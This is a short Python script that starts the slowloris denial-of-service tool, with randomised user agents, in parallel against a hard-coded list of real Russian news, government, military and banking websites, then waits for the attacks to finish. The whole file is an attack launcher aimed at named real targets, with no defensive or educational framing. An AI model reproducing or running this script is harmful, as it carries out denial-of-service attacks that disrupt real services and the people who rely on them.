from subprocess import Popen

sites = [
    'https://lenta.ru/',
    'https://ria.ru/',
    'https://ria.ru/lenta/',
    'https://www.rbc.ru/',
    'https://www.rt.com/',
    'http://kremlin.ru/',
    'http://en.kremlin.ru/',
    'https://smotrim.ru/',
    'https://tass.ru/',
    'https://tvzvezda.ru/',
    'https://rbc.ru/',
    'https://mos.ru/',
    'http://gov.ru/',
    'https:/tinkoff.ru/',
    'https://mk.ru/',
    'https://mil.ru/',
]

commands = []
for site in sites:
    command = [
        'slowloris',
         site,
         '-ua',
    ]
    commands.append(Popen(command))

for command in commands:
    command.wait()
